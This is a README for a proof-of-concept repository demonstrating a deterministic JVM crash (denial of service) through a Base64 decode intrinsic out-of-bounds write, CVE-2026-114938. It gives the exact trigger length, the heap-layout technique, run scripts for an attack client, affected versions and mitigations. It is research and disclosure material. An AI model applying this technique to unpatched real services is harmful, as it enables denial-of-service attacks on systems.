# Java4Shell-Deterministic-DoS-PoC

**CVE-2026-114938 (Java4Shell) derivative: deterministic denial-of-service via two consecutive single-argument `decode(byte[])` calls + humongous hole geometry. Pure-JDK Client → Server PoC.**

[English](README.md) | [简体中文](README_zh-CN.md) · Full analysis: [REPORT.md](REPORT.md) | [REPORT_zh-CN.md](REPORT_zh-CN.md)

---

## What this is

The reference PoC for CVE-2026-114938 observes the out-of-bounds write through the **two-argument** `decode(byte[], byte[])` overload with an oversized destination buffer. This project removes that requirement:

- **The only firing API is the single-argument `decode(byte[])`** — the entry point real applications actually use (HTTP Basic headers, tokens, upload fields) — executed **twice in a row** (shot → re-warm C2 → shot).
- The trigger length (`2,796,161 = 64k+1`) is tuned so the decoder's internal destination buffer becomes a **region-aligned humongous object** that exactly fills a hole left by G1 eager-reclaim. The intrinsic's fixed 64-byte store then **deterministically** crosses the region boundary by 32 bytes into a sentinel array's header.
- A corrupted array length field turns into a forced out-of-bounds read → **SIGSEGV + hs_err forensics**. No heap-layout lottery: **3/3 measured hits within ≤2 shots** (fire time 82–584 ms).
- Causality is closed by a negative control: `-XX:-UseBASE64Intrinsics` → zero spill, victim survives.

## Requirements

| Requirement | Notes |
|---|---|
| x86-64 CPU with AVX-512 VBMI | Intel Ice Lake+ / AMD Zen 4+ (`avx512f`, `avx512bw`, `avx512vbmi`, `bmi2`) |
| Unpatched runtime | Java 17 line 17.0.6–17.0.20, or pre-fix Java 21/25 builds (fixed: 17.0.21.1 / 21.0.13.1 / 25.0.5.1) |
| G1 GC | `-XX:G1HeapRegionSize=1m` (set by the run scripts) |
| Tested on | Windows x86-64, Zulu JDK 17.0.20+8 |

## Quick start

Linux / macOS:

```bash
./build.sh
./run-server.sh          # terminal A - victim, binds 127.0.0.1:47470
./run-client.sh          # terminal B - attacker
```

Windows:

```bat
build.bat
run-server.bat           :: window A - victim
run-client.bat           :: window B - attacker
```

Expected client verdict: `HIT shot=N ... → TARGET DOWN (verified: port closed)`, exit code `0`.
Expected server console: `*** LENGTH CORRUPTED *** ... 0xA6699AA6` then `EXCEPTION_ACCESS_VIOLATION` with an `hs_err_pid*.log` in `logs/`.

Standalone environment check (no network):

```bash
java -cp out com.aweimc.j4shell.Main probe --len 129
# expect: spill=[98..160) oob=62B  REPRODUCED
```

Negative control (must survive):

```bash
./run-server-safe.sh     # = -XX:-UseBASE64Intrinsics; client should report SURVIVED (exit 2)
```

## Measured results (this machine, Zulu 17.0.20+8)

| Run | Verdict | Detail |
|---|---|---|
| E2E via `run-*.sh` | **TARGET DOWN** | `HIT shot=1 row=1 len=1048560→-1503028570 (0xA6699AA6)`, fire 82 ms |
| E2E via `run-*.bat` | **TARGET DOWN** | `HIT shot=2 ... (0xA6699AA6)`, fire 490 ms |
| 2 earlier runs | **TARGET DOWN** | `HIT shot=1` both, fire 138/219 ms |
| Negative control | survived | `probe=none`, `SURVIVED shots=2`, client exit 2 |

Evidence files in [`evidence/`](evidence/): probe output, client/server console transcripts, `hs_err_victim-SIGSEGV.log` (`Problematic frame: j com.aweimc.j4shell.DualDecodeVictim.forceCrash(II)V+68`), negative-control transcripts.

## Repository layout

```
src/com/aweimc/j4shell/   Payload / DualDecodeVictim / J4ShellServer / J4ShellClient / Main
build.sh / build.bat      compile (pure JDK, no dependencies)
run-server.sh|.bat        victim server (127.0.0.1:47470)
run-server-safe.sh|.bat   negative control (-XX:-UseBASE64Intrinsics)
run-client.sh|.bat        attack client
evidence/                 probe + E2E transcripts + hs_err forensics + negative control
REPORT.md                 full technical report (EN) / REPORT_zh-CN.md (中文)
```

## Scope and limitations (read this)

- The deterministic hit requires the **humongous hole layout**, which the victim pre-conditions in `arm()`. On an unconditioned real application the 32-byte region-boundary crossing per humongous dst is still structural, but *what* it hits is probabilistic; this PoC upgrades the odds from a "100k-cycle lottery" to "every shot deterministically crosses a 32-byte high-value boundary". Quantifying multi-shot hit rates on unconditioned apps is future work.
- Real Minecraft servers/clients are **not** reachable (no decode surface on the wire protocol; measured in prior work) — the victim here is a purpose-built lab service.
- This is vulnerability research on **local/authorized environments only**. The server binds `127.0.0.1` by default. Do not use against systems you do not own or have written authorization for.

## Mitigation

Upgrade to 17.0.21.1+ / 21.0.13.1+ / 25.0.5.1+ (fixed builds carry the `.1` suffix). Interim: `-XX:-UseBASE64Intrinsics` (all architectures) or `-XX:UseAVX=2` (x86-64 only).

## License / attribution

Research code by [AweiMC](https://github.com/AweiMC). Vulnerability originally disclosed by Calif (2026-11-17) as "Java4Shell" / CVE-2026-114938.
